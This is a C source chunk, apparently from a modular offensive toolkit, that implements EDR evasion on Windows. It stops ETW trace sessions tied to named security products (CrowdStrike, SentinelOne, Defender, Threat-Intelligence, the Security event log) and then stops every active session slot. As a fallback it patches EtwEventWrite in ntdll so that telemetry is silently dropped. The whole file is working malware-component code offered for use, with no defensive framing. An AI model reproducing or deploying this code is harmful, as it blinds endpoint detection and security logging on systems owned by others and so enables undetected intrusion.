// chunk: evasion/etw_session_stop
// depends: (none)
// provides: patch_etw
// headers: windows.h
// risk: high
// note: Stops EDR-owned ETW trace sessions using ControlTraceA with EVENT_TRACE_CONTROL_STOP. Enumerates active sessions by querying known EDR session names, then terminates them. Also patches EtwEventWrite as fallback. Higher risk — stopping named sessions may generate event log entries.

#ifndef CHUNK_ETW_SESSION_STOP
#define CHUNK_ETW_SESSION_STOP

#include <windows.h>
#include <evntrace.h>

static int patch_etw(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    int stopped = 0;

    // Known EDR/security ETW trace session names
    static const char *edr_sessions[] = {
        "CrowdStrike Falcon ETW",
        "SentinelOne ETW Session",
        "Defender-ETW-Session",
        "Microsoft-Windows-Threat-Intelligence",
        "EventLog-Security",
        "NT Kernel Logger",
        "DiagLog",
        "Circular Kernel Context Logger",
        "SenseIRTraceSession",
        "MsMpEng",
        NULL
    };

    // Attempt to stop each known EDR session
    for (int i = 0; edr_sessions[i]; i++) {
        // Allocate buffer for EVENT_TRACE_PROPERTIES + session name
        BYTE props_buf[1024];
        ZeroMemory(props_buf, sizeof(props_buf));
        EVENT_TRACE_PROPERTIES *props = (EVENT_TRACE_PROPERTIES *)props_buf;
        props->Wnode.BufferSize = sizeof(props_buf);
        props->LoggerNameOffset = sizeof(EVENT_TRACE_PROPERTIES);

        ULONG status = ControlTraceA(
            0,
            edr_sessions[i],
            props,
            EVENT_TRACE_CONTROL_STOP
        );
        if (status == ERROR_SUCCESS)
            stopped++;
    }

    // Enumerate all 64 possible trace session slots and stop any active ones
    for (ULONG sid = 0; sid < 64; sid++) {
        BYTE props_buf[1024];
        ZeroMemory(props_buf, sizeof(props_buf));
        EVENT_TRACE_PROPERTIES *props = (EVENT_TRACE_PROPERTIES *)props_buf;
        props->Wnode.BufferSize = sizeof(props_buf);
        props->LoggerNameOffset = sizeof(EVENT_TRACE_PROPERTIES);

        // Query to see if this session slot is active
        ULONG status = ControlTraceA(
            (TRACEHANDLE)(ULONG_PTR)sid,
            NULL,
            props,
            EVENT_TRACE_CONTROL_QUERY
        );

        if (status == ERROR_SUCCESS) {
            // Active session found — attempt to stop it
            BYTE stop_buf[1024];
            ZeroMemory(stop_buf, sizeof(stop_buf));
            EVENT_TRACE_PROPERTIES *stop_props = (EVENT_TRACE_PROPERTIES *)stop_buf;
            stop_props->Wnode.BufferSize = sizeof(stop_buf);
            stop_props->LoggerNameOffset = sizeof(EVENT_TRACE_PROPERTIES);

            ControlTraceA(
                (TRACEHANDLE)(ULONG_PTR)sid,
                NULL,
                stop_props,
                EVENT_TRACE_CONTROL_STOP
            );
            stopped++;
        }
    }

    // Fallback: patch EtwEventWrite to silence any remaining telemetry
    if (ntdll) {
        BYTE *etw_write = (BYTE *)GetProcAddress(ntdll, "EtwEventWrite");
        if (etw_write) {
            BYTE patch[] = {0x33, 0xC0, 0xC3};  // xor eax,eax; ret
            DWORD old;
            if (VirtualProtect(etw_write, sizeof(patch), PAGE_EXECUTE_READWRITE, &old)) {
                for (unsigned i = 0; i < sizeof(patch); i++)
                    etw_write[i] = patch[i];
                VirtualProtect(etw_write, sizeof(patch), old, &old);
                stopped++;
            }
        }
    }

    return stopped > 0 ? 1 : 0;
}

#endif
